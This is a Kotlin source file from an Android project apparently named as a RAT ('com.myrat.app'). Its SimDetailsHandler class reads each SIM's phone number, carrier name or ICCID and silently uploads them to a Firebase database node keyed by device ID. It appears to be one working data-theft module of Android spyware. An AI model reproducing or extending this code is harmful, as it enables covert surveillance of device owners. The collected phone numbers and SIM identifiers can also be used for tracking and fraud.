package com.myrat.app.handler

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import com.google.firebase.database.FirebaseDatabase
import com.myrat.app.utils.Logger

class SimDetailsHandler(
    private val context: Context,
    private val deviceId: String
) {

    @SuppressLint("MissingPermission")
    fun uploadSimDetails() {
        try {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subscriptionManager == null) {
                Logger.error("SubscriptionManager is null")
                return
            }
            
            val simNumbers = mutableMapOf<String, String>()

            val subscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    subscriptionManager.activeSubscriptionInfoList
                } catch (e: SecurityException) {
                    Logger.error("Security exception getting subscription info: ${e.message}")
                    null
                } catch (e: Exception) {
                    Logger.error("Exception getting subscription info: ${e.message}")
                    null
                }
            } else {
                null
            }

            if (!subscriptions.isNullOrEmpty()) {
                subscriptions.forEachIndexed { index, info ->
                    try {
                        val simSlot = "sim${index + 1}"
                        simNumbers[simSlot] = extractSimDetail(info, simSlot)
                    } catch (e: Exception) {
                        Logger.error("Error processing subscription $index: ${e.message}")
                        simNumbers["sim${index + 1}"] = "Error_sim${index + 1}"
                    }
                }
            } else {
                simNumbers["sim1"] = "No SIM detected"
            }

            try {
                val simRef = FirebaseDatabase.getInstance().getReference("Device").child(deviceId).child("sim_cards")
                simRef.setValue(simNumbers)
                    .addOnSuccessListener { 
                        Logger.log("Uploaded SIM details for $deviceId: $simNumbers") 
                    }
                    .addOnFailureListener { e -> 
                        Logger.error("SIM upload failed: ${e.message}", e) 
                    }
            } catch (e: Exception) {
                Logger.error("Firebase operation failed in uploadSimDetails: ${e.message}", e)
            }

        } catch (e: Exception) {
            Logger.error("SIM fetch error: ${e.message}", e)
        }
    }

    private fun extractSimDetail(info: SubscriptionInfo, simSlot: String): String {
        return try {
            val number = try { info.number } catch (e: Exception) { null }
            val carrierName = try { info.carrierName?.toString() } catch (e: Exception) { null }
            val iccId = try { info.iccId } catch (e: Exception) { null }

            when {
                !number.isNullOrBlank() -> number
                !carrierName.isNullOrBlank() -> "Carrier: $carrierName"
                !iccId.isNullOrBlank() -> "ICCID: $iccId"
                else -> "Unknown_$simSlot"
            }
        } catch (e: Exception) {
            Logger.error("Error extracting SIM detail for $simSlot: ${e.message}")
            "Error_$simSlot"
        }
    }
}